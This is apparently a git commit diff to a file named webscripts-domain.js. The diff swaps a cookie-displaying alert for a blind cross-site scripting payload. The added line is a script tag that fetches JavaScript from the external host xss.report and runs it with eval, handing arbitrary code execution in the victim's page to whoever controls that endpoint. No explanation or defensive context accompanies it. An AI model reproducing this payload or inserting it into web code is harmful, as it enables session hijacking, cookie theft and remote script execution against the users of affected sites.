5336b286e4faec50e4d57d34a1354fa4c78999fc
arkede <162848307+arkede@users.noreply.github.com>
2024-07-31 23:05:16 +0800

    Update webscripts-domain.js

--- Pages/webscripts-domain.js
+++ Pages/webscripts-domain.js
@@ -1,1 +1,1 @@
-alert('Your cookies: ' + document.cookie);
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/adafadfd");a.send();</script>
